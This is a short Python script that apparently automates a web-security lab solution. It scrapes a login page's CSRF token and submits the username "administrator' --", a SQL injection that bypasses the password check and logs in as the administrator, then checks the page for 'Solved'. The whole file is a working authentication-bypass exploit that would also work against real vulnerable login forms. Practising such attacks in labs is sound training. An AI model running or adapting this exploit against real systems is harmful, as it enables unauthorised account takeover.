import requests
import re
from bs4 import BeautifulSoup

url = input('Enter the URL the lab provide: ');
domain = re.search(r'^(https?://[^/]+)', url).group(1)
session = requests.Session()

login_url = domain + '/login'
r = session.get(login_url)
soup = BeautifulSoup(r.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']
data = {
    'csrf': csrf,
    "username": "administrator' --",
    "password": "123456"
}

try:
    r = session.post(login_url, data=data)
    res = session.get(domain)
except requests.exceptions.ConnectionError:
    print('Error connecting to the server. Check your URL.')


if ('Solved' in res.text):
    print('Solved. Visit ' + domain + ' to see the solution.')
else:
    print('Not Solved')